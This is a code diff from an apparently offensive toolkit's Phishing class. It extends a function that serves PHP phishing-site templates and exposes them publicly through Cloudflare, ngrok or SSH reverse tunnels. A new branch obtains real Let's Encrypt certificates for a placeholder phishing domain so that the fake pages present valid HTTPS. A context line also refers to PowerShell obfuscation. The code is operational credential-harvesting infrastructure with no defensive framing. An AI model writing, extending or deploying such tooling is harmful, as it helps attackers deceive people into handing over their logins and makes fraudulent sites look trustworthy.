@@ -55,7 +55,7 @@ class Phishing:
             return f"ERROR: PS1 obfuscation failed: {e}"
 
     @staticmethod
-    def start_phishing_server(template, port=8080, on_output=None, use_tunnel=False):
+    def start_phishing_server(template, port=8080, on_output=None, use_tunnel=False, tunnel_mode="cloudflare"):
         """Launch a PHP phishing server with optional HTTPS tunneling."""
         site_path = os.path.join("shadowcypher/modules/phish_data/sites", template.lower())
         if not os.path.exists(site_path):
@@ -70,7 +70,7 @@ class Phishing:
         task_id = runner.execute_task(f"PHISH_{template}", cmd, callback=on_output, cwd=site_path)
         
         if use_tunnel:
-            Phishing.start_secure_tunnel(port, on_output=on_output)
+            Phishing.start_secure_tunnel(port, mode=tunnel_mode, on_output=on_output)
             
         return task_id
 
@@ -88,6 +88,10 @@ class Phishing:
         elif mode == "ngrok":
             cmd = ["ngrok", "http", str(port)]
             return runner.execute_task("TUNNEL_NGROK", cmd, callback=on_output)
+        elif mode == "certbot":
+            # Real CA-signed certs for custom domains
+            from shadowcypher.core.security import hardener
+            return hardener.provision_letsencrypt("your-phish-domain.com", webroot=os.getcwd())
         else:
             # Fallback to localhost.run via SSH
             cmd = ["ssh", "-R", f"80:localhost:{port}", "nokey@localhost.run"]
